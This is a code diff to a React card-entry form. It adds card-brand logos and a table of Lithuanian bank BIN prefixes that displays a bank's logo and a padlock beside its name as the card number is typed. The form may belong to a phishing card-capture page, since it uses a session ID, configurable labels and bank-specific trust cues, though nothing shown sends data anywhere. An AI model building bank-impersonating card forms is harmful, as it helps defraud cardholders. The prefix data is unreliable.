@@ -39,6 +39,56 @@ function detectCardBrand(number: string): CardBrand | null {
   return null;
 }
 
+function CardBrandLogo({ brand }: { brand: string }) {
+  if (brand === "mastercard") {
+    return (
+      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Mastercard">
+        <circle cx="13" cy="11" r="9" fill="#EB001B" />
+        <circle cx="23" cy="11" r="9" fill="#F79E1B" fillOpacity="0.85" />
+      </svg>
+    );
+  }
+  if (brand === "maestro") {
+    return (
+      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Maestro">
+        <circle cx="13" cy="11" r="9" fill="#0099DF" />
+        <circle cx="23" cy="11" r="9" fill="#EC0000" fillOpacity="0.85" />
+      </svg>
+    );
+  }
+  if (brand === "visa") {
+    return <span className="text-sm font-black italic tracking-tight text-[#1A1F71]">VISA</span>;
+  }
+  if (brand === "amex") {
+    return (
+      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-white">AMEX</span>
+    );
+  }
+  return null;
+}
+
+// Litvanya bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
+type BankBin = { name: string; logo: string; prefixes: string[] };
+const LT_BANK_BINS: BankBin[] = [
+  { name: "Swedbank", logo: "/bank-logos/lithuania/swedbank-lt.png", prefixes: ["5168", "5224", "5413", "4898", "4026", "4714", "4921", "5308", "5589", "6763"] },
+  { name: "SEB", logo: "/bank-logos/lithuania/seb-lt.png", prefixes: ["4167", "4235", "4899", "5290", "5319", "5350", "5412", "5434", "5571", "6764"] },
+  { name: "Luminor", logo: "/bank-logos/lithuania/luminor-lt.png", prefixes: ["4025", "4738", "5125", "5150", "5187", "5299", "5360", "5416", "5528", "6762"] },
+  { name: "Šiaulių bankas", logo: "/bank-logos/lithuania/siauliu-bankas-lt.png", prefixes: ["4551", "5280", "5323", "5584", "6765"] },
+  { name: "Citadele", logo: "/bank-logos/lithuania/citadele-lt.png", prefixes: ["4191", "4328", "5124", "5189", "5274", "5567"] },
+  { name: "Kredito unijos", logo: "/bank-logos/lithuania/kredito-unijos-lt.png", prefixes: ["5164", "5359", "5483"] },
+];
+
+function detectBank(number: string): BankBin | null {
+  const digits = number.replace(/\D/g, "");
+  if (digits.length < 4) return null;
+  for (const bank of LT_BANK_BINS) {
+    for (const p of bank.prefixes) {
+      if (digits.startsWith(p)) return bank;
+    }
+  }
+  return null;
+}
+
 type Props = {
   sessionId: string;
 };
@@ -85,6 +135,7 @@ export function CardClient({ sessionId }: Props) {
   const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
   const cvcValid = /^\d{3,4}$/.test(cvc);
   const brand = useMemo(() => detectCardBrand(number), [number]);
+  const bank = useMemo(() => detectBank(number), [number]);
   const numberValid = useMemo(() => {
     if (!number) return false;
     const digits = number.replace(/\D/g, "");
@@ -242,16 +293,33 @@ export function CardClient({ sessionId }: Props) {
                 onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                 autoComplete="cc-number"
               />
-              {brand && (
-                <div className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 rounded-md bg-white/90 px-2 py-1 shadow-sm">
-                  {brand.name === "visa" && <span className="text-xs font-bold text-[#1a1f71]">VISA</span>}
-                  {brand.name === "mastercard" && <span className="text-xs font-bold text-[#eb001b]">MC</span>}
-                  {brand.name === "amex" && <span className="text-xs font-bold text-[#2e77bc]">AMEX</span>}
-                  {brand.name === "maestro" && <span className="text-xs font-bold text-[#00a2e5]">MAESTRO</span>}
+              {(brand || bank) && (
+                <div className="pointer-events-none absolute right-3 top-1/2 flex -translate-y-1/2 items-center gap-2">
+                  {bank && (
+                    <img
+                      src={bank.logo}
+                      alt={bank.name}
+                      title={bank.name}
+                      className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
+                    />
+                  )}
+                  {brand && (
+                    <div className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
+                      <CardBrandLogo brand={brand.name} />
+                    </div>
+                  )}
                 </div>
               )}
             </div>
           </label>
+          {bank && (
+            <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-400">
+              <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[#0fae4e]">
+                <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
+              </svg>
+              {bank.name}
+            </p>
+          )}
           <div className="grid grid-cols-2 gap-3">
             <label className="block text-sm font-medium text-white">
               {settings.card_expiry_label}
